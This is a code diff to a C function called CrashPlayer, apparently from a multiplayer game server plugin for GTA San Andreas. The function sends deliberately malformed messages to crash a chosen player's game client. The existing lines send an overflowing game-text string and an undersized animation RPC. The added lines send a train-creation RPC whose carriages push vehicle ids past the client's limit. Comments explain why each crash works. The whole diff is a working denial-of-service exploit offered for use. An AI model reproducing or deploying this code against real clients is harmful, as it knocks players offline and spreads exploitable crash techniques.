@@ -1390,6 +1390,7 @@ void CrashPlayer(int playerid)
 	TRACE;
 	struct RPCDATA_ClearAnimations rpcdata_ca;
 	struct RPCDATA_ShowGangZone rpcdata_sgz;
+	struct RPCDATA_CreateVehicle rpcdata_cv;
 
 	GameTextForPlayer(playerid, 5, 5, "Wasted~k~SWITCH_DEBUG_CAM_ON~~k~~TOGGLE_DPAD~~k~~NETWORK_TALK~~k~~SHOW_MOUSE_POINTER_TOGGLE~");
 
@@ -1401,6 +1402,11 @@ void CrashPlayer(int playerid)
 	/*sending ApplyAnimation with a payload of only the playerid crashes client, that's why ClearAnimations rpcdata is used here*/
 	rpcdata_ca.playerid = playerid;
 	SendRPC(playerid, RPC_ApplyAnimation, &rpcdata_ca, sizeof(rpcdata_ca) * 8);
+
+	/*client always creates 3 carriages but doesn't check if they go past MAX_VEHICLE_ID*/
+	rpcdata_cv.vehicleid = 1998;
+	rpcdata_cv.model = MODEL_STREAK;
+	SendRPC(playerid, RPC_CreateVehicle, &rpcdata_cv, sizeof(rpcdata_cv) * 8);
 }
 #endif
 
